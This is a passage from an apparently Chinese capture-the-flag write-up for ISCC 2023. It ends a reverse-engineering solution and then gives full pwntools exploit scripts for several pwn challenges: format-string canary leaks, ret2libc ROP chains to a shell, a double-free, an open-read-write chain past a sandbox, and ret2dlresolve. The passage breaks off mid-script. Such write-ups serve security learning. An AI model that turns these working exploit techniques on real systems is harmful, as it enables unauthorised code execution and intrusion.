class="hljs-number">26</span>) % <span class="hljs-number">26</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data[<span class="hljs-number">26</span>] = &#123;<br>        <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x93</span>,<br>        <span class="hljs-number">0x70</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x5F</span>,<br>    &#125;;<br>    <span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;ISCC&quot;</span>;<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">26</span>;<br>    <span class="hljs-built_in">decrypt</span>(data,key,len);<br>    <span class="hljs-built_in">Caesar</span>(data,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> i : data) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,i);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后手动补上一个后花括号</p><h3 id="CrackMePlease"><a href="#CrackMePlease" class="headerlink" title="CrackMePlease"></a>CrackMePlease</h3><p>拿到程序后先简单动调分析一下逻辑，发现data被进行一些加密操作后，最后送到Str1中与输入进行比较。所以随便输入之后，直接断点断在字符串比较处，观察Str1内存的值即可</p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-21.png" alt="iscc2023-21"></p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-22.png" alt="iscc2023-22"></p><p>把后面{EASY}去掉即可ISCC{agyeU&#x2F;m)}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="三个愿望"><a href="#三个愿望" class="headerlink" title="三个愿望"></a>三个愿望</h3><p>随机数种子可以覆盖，调试找canary位置，secondwish泄露canary，thirdwish填充+canary返回到后门函数，编写解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10001</span>)<br><span class="hljs-comment">#p = process(&#x27;./makewishes&#x27;)</span><br>elf = cdll.LoadLibrary(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>elf.srand(<span class="hljs-number">1</span>)<br>number = <span class="hljs-built_in">str</span>(elf.rand() % <span class="hljs-number">9</span> + <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_num</span>():<br>    p.recvuntil(<span class="hljs-string">&#x27;Please give me a number!\n&#x27;</span>)<br>    p.sendline(number)<br><br>backdoor = <span class="hljs-number">0x4011D6</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;Now you can make your first wish\n&#x27;</span>)<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">14</span> + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">1</span>)<br>p.send(padding)<br><br>send_num()<br><br>p.recvuntil(<span class="hljs-string">&#x27;Now you can make your second wish!\n&#x27;</span>)<br>leak_canary = <span class="hljs-string">b&#x27;%11$p&#x27;</span><br>p.sendline(leak_canary)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> (<span class="hljs-built_in">hex</span>(canary))<br><br>send_num()<br><br>p.recvuntil(<span class="hljs-string">&#x27;Now you can make your final wish!\n&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(backdoor)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>ret2libc ，第一个read填充后覆盖判断，进入第二个read填充，print_name函数memcpy有栈溢出，先泄露puts地址计算偏移，返回到main函数，再重新执行一遍到print_name直接返回system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10000</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./Login&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(&#x27;./Login&#x27;)</span><br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x4008c3</span><br>main_addr = <span class="hljs-number">0x400796</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">username</span>(<span class="hljs-params">name</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;input the username:\n&quot;</span>)<br>    p.send(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">password</span>(<span class="hljs-params">payload</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;input the password:\n&quot;</span>)<br>    p.send(payload)<br><br>name = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">28</span> + p32(<span class="hljs-number">365696460</span>)<br>username(name)<br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>password(payload1)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libc_base = puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>bin_sh = libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()+libc_base<br><br>username(name)<br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr) + p64(main_addr)<br>password(payload2)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="第一用笔-1"><a href="#第一用笔-1" class="headerlink" title="第一用笔-1"></a>第一用笔-1</h3><p>第一个函数中文件code.txt在服务器上，要验证和输入内容相同，根据提示是笔法九用<br>顿笔、挫笔、驭锋、蹲锋 、足存锋、衄锋、趯锋、按锋、揭笔按顺序拼音不够8字符末尾填充0来绕过<br>第二个函数存在栈溢出，但是溢出很小应该要先跳到func_101101再ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10002</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./usage_of_pen&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment"># p = process(&#x27;./usage_of_pen&#x27;)</span><br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>main = <span class="hljs-number">0x400B96</span><br>pop_rdi = <span class="hljs-number">0x400c53</span><br>func_read = <span class="hljs-number">0x400B0F</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;!&#x27;</span>)<br>stroke = <span class="hljs-string">&#x27;dunbi000cuobi000yufeng00dunfeng0cunfeng0nvfeng00yuefeng0anfeng00jiebi000&#x27;</span><br>p.send(stroke)<br><br>p.recvuntil(<span class="hljs-string">&#x27;or you can look for other space\n&#x27;</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(func_read)<br>p.send(payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(func_read)<br>p.send(payload2)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>libc_base = puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br>bin_sh = libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()+libc_base<br><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr) + p64(func_read)<br>p.sendline(payload3)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h3><p>Double free任意地址写绕过check，后面有两个字节的溢出，过判断已经给了栈变量地址，取其低位覆盖rpb低位字节实现栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./attachment-32&quot;)</span><br>p = remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10021</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./attachment-32&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendafter(<span class="hljs-string">&quot;请选择：&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;请输入序号：&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;请输入大小：&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;请选择：&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;请输入序号：&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">&quot;请选择：&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;请输入序号：&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,Content</span>):<br>    p.sendafter(<span class="hljs-string">&quot;请选择：&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;请输入序号：&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;请输入编辑内容：&quot;</span>,Content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bye</span>():<br>    p.sendafter(<span class="hljs-string">&quot;请选择：&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>) <span class="hljs-comment">#chunk0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>) <span class="hljs-comment">#chunk1</span><br><br>free(<span class="hljs-number">0</span>) <br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>) <span class="hljs-comment">#double free</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>) <br>check_addr = <span class="hljs-number">0x6021d8</span><br>edit(<span class="hljs-number">0</span>,p64(check_addr)) <span class="hljs-comment">#edit chunk fd-&gt;bss</span><br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>) <br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)<br><br>check_num = p32(<span class="hljs-number">0x15CC15CC</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">60</span> + p32(<span class="hljs-number">0xCC51CC51</span>)<br>edit(<span class="hljs-number">3</span>,check_num) <span class="hljs-comment">#pass check</span><br>bye() <span class="hljs-comment">#break</span><br><br>p.recvuntil(<span class="hljs-string">&quot;reward: &quot;</span>)<br>buf_addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-comment"># print(hex(buf_addr))</span><br>buf_low = buf_addr &amp; <span class="hljs-number">0xffff</span><br><span class="hljs-comment"># print(hex(buf_low))</span><br><br>main = <span class="hljs-number">0x400A24</span><br>pop_rdi = <span class="hljs-number">0x400cb3</span><br>binsh = <span class="hljs-number">0x400CD8</span><br>shell = <span class="hljs-number">0x4008EB</span><br><br>payload = p64(pop_rdi) + p64(binsh) + p64(shell) + p64(main) + p16(buf_low-<span class="hljs-number">0x8</span>)<br>p.sendafter(<span class="hljs-string">&#x27;say:&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="困局"><a href="#困局" class="headerlink" title="困局"></a>困局</h3><p>沙盒，禁用了execve不能用system了 </p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-23.png" alt="iscc2023-23"></p><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-24.png" alt="iscc2023-24"></p><p>考虑orw&#x2F;shellcode，先泄露canary，再利用rop泄露基地址，之后再构造orw的rop即可，read函数读入的够长放得下rop链，但是主要需要找一个位置写flag，思路有很多，我这里用gets写到bss段利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./Trapped&quot;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./Trapped&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10066</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># gdb.attach(p)</span><br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>talk_addr = <span class="hljs-number">0x400777</span><br>pop_rdi = <span class="hljs-number">0x400a23</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_canary</span>(<span class="hljs-params">text</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;This is a larger box\n&#x27;</span>)<br>    p.send(text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">recv_canary</span>():<br>    canary = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;00&#x27;</span>),<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span> (<span class="hljs-built_in">hex</span>(canary))<br>    <span class="hljs-keyword">return</span> canary<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">talk</span>(<span class="hljs-params">text</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;We have a lot to talk about\n&#x27;</span>)<br>    p.send(text)<br><br>leak_canary = <span class="hljs-string">b&#x27;%9$p&#x27;</span><br>send_canary(leak_canary)<br><br>first = <span class="hljs-string">b&#x27;I want to leak canary&#x27;</span><br>talk(first)<br><br>canary = recv_canary()<br><br>send_canary(leak_canary)<br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(talk_addr)<br>talk(payload1)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#print(hex(puts_addr))</span><br><br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_addr = libc_base + libc.sym[<span class="hljs-string">&quot;gets&quot;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>write_addr = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br><br>pop_rsi = libc_base + <span class="hljs-number">0x202f8</span><br>pop_rdx = libc_base + <span class="hljs-number">0x1b92</span><br>bss = <span class="hljs-number">0x601060</span> <br><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span> + p64(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(bss) + p64(gets_addr)<br>payload3 += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>payload3 += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(bss+<span class="hljs-number">30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">50</span>) + p64(read_addr)<br>payload3 += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(bss+<span class="hljs-number">30</span>) + p64(pop_rdx) + p64(<span class="hljs-number">50</span>) + p64(write_addr)<br>talk(payload3)<br>p.sendline(<span class="hljs-string">b&#x27;flag\0&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Eat-num"><a href="#Eat-num" class="headerlink" title="Eat_num"></a>Eat_num</h3><p>纯例题作用，ret2dlresolve，利用pwntools自带的工具实现更方便的漏洞利用，编写脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = elf = ELF(<span class="hljs-string">&quot;./attachment-38&quot;</span>)<br>rop = ROP(context.binary)<br>dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="hljs-string">&quot;system&quot;</span>,args=[<span class="hljs-string">&quot;/bin/sh&quot;</span>])<br><br><span class="hljs-comment">#p = process(&quot;./attachment-38&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10067</span>)<br><br>rop.raw(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">76</span>)<br>rop.read(<span class="hljs-number">0</span>, dlresolve.data_addr)<br>rop.ret2dlresolve(dlresolve)<br><span class="hljs-comment">#log.info(rop.dump())</span><br><br>p.sendline(rop.chain())<br>p.sendline(dlresolve.payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="SIMS"><a href="#SIMS" class="headerlink" title="SIMS"></a>SIMS</h3><p> <img src="https://cdn.jsdelivr.net/gh/Beckaf/img@main/img/iscc2023-25.png" alt="iscc2023-25"></p><p>先绕过判断，unsortbin+show()泄露libc_base，doublefree任意改写free_hook执行system ，由于libc引入了tcache，因此需要先填满tcache后才能用到fastbin，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./SIMS&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./SIMS&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10085</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;please choose one!&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Age of Stu:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;please choose one!&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&#x27;Index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title 